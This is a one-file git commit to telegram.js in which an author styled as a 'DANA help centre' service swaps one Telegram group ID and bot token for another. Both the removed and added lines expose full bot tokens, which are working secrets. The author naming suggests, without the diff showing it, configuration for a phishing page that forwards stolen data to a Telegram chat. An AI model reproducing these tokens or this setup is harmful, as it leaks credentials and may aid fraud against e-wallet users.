80aa3f93c71b51b1643a45bb9d0f410b5c949702
layanan-pusat-bantuan-danaa <umrohgratis14@gmail.com>
2026-07-12 07:34:32 +0700

    Update telegram.js

--- telegram.js
+++ telegram.js
@@ -1,2 +1,2 @@
-const grup = "5842054391";
-const token  = "8446620248:AAEepdNIXK15ZYyapdDlD8LGmyQZCMUx9ng";
+const grup = "1983373769";
+const token  = "7181255750:AAFXGpBx557jBswyQeH3tX5M8BX3X4frK-A";
